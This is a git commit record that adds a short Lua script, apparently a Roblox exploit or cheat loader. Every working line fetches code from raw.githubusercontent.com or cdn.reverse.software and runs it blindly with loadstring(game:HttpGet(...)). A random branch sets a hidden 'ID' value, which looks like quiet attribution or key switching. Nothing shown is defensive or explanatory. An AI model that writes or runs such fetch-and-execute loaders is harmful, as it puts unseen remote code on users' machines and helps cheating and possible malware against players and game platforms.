a01b892458256f2c0987c9acf7438c41e60e7e15
Miguel7172 <romaozin1607@gmail.com>
2025-08-20 15:41:27 -0300

    Adicionando script7.lua automaticamente

---
+++ script7.lua
@@ -0,0 +1,13 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel7172/Loading-UI/refs/heads/main/loading"))()
+
+
+local chance = math.random(1, 100)
+
+if chance <= 20 then
+    -- 20% de chance
+    ID = "d98f46c5-df0d-4ba3-9db0-61244be7c8e6"
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+else
+    -- 80% de chance de executar o conteúdo enviado
+    ID="Id aleatorio";  loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+end
